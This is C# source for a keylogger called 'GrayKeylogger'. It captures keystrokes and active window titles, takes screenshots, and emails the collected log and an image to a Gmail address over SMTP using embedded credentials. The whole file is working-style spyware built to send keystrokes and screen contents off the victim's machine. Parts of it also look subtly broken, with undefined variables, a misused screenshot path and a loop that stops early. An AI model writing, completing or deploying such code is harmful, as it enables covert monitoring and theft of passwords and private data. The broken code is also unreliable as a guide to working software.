using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
// using System.Text;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Net.Mail;
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;
public static class GrayKeylogger
{
    [System.Runtime.InteropServices.DllImport("user32")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
    public static string l = null;
    public static string c = null;
    public static string Title = null;
    public static bool m = IsKeyDown(Keys.Shift);
public static void Main(){
        while (true)
        {
            for (int i = 8; i <= 222; i++)
            {
					if (i == 8 || i == 13 || i == 32 ||  (48 <= i && i <= 57) || (65 <= i && i <= 90) || (186 <= i && i <= 192) || (219 <= i && i <= 222))
                        {
                            if (GetAsyncKeyState(i) == -32767 & !IsKeyDown(Keys.Control))
                            {
                                l += Title == GetWinTitle() & GetWinTitle() != null ? null : "\n" + "[" + GetWinTitle() + "]" + "\n" + GiveKeyValue(i);
                                if (l.Length >= logsize){l = SendMail();}
                                if (GetWinTitle() != Title){ Title = GetWinTitle();}
                            }
                            break;
                        }
            }
            System.Threading.Thread.Sleep(10);
        }
    }
    public static bool IsKeyDown(Keys Key)
    {
        return (Control.ModifierKeys & Key) == Key;
    }
    private static string GetWinTitle()
    {
        const int nChars = 256;
        System.Text.StringBuilder Buff = new System.Text.StringBuilder(nChars);
        return GetWindowText(GetForegroundWindow(), Buff, nChars) > 0 ? Buff.ToString() : null;
    }
    public static string SendMail()
    {
        TakeScreenshot(ScrPath);
        using (var Attachment = new Attachment(ScrPath))
        {
            using (MailMessage Gmail = new MailMessage() { Subject = Environment.UserName + " [" + DateTime.Now + "]" })
            {
                Gmail.To.Add(email);
                Gmail.From = new MailAddress(email);
                Gmail.Body = l;
                Gmail.Attachments.Add(Attachment);
                using (SmtpClient Smtp = new SmtpClient("smtp.Gmail.com") { Credentials = new System.Net.NetworkCredential(email, Password), Port = 587, EnableSsl = true })
                {
                    Smtp.Send(Gmail);
                }
            }
        }
        return null;
    }
    public static void TakeScreenshot(string path)
    {
        Rectangle bounds = Screen.GetBounds(Point.Empty);
        using(Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
        {
            using(Graphics g = Graphics.FromImage(bitmap))
            {
                 g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }
            bitmap.Save("test.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
        }
    }
    public static string GiveKeyValue(int i)
    {
        c = null;
        m = IsKeyDown(Keys.Shift);
        if (i > 64 && i < 91) 
		{
			c = Control.IsKeyLocked(Keys.CapsLock) | m ? Convert.ToChar(i).ToString().ToUpper() : Convert.ToChar(i).ToString().ToLower();
			}
        if (i == 8) { c = "[BACK]";}
        if (i == 13) { c = "\n";}
        if (i == 32) { c = " ";}
        if (i == 48) { c = m ? ")" : "0";}
        if (i == 49) { c = m ? "!" : "1";}
        if (i == 50) { c = m ? "@" : "2";}
        if (i == 51) { c = m ? "#" : "3";}
        if (i == 52) { c = m ? "$" : "4";}
        if (i == 53) { c = m ? "%" : "5";}
        if (i == 54) { c = m ? "^" : "6";}
        if (i == 55) { c = m ? "&" : "7";}
        if (i == 56) { c = m ? "*" : "8";}
        if (i == 57) { c = m ? "(" : "9";}
        if (i == 186) { c = m ? ":" : ";";}
        if (i == 187) { c = m ? "+" : "=";}
        if (i == 188) { c = m ? "<" : ",";}
        if (i == 189) { c = m ? "_" : "-";}
        if (i == 190) { c = m ? ">" : ".";}
        if (i == 191) { c = m ? "?" : "/";}
        if (i == 192) { c = m ? "~" : "`";}
        if (i == 219) { c = m ? "{" : "[";}
        if (i == 220) { c = m ? "|" : @"\";}
        if (i == 221) { c = m ? "}" : "]";}
        if (i == 222) { c = m ? "\"" : "'";}
        return c;
    }
}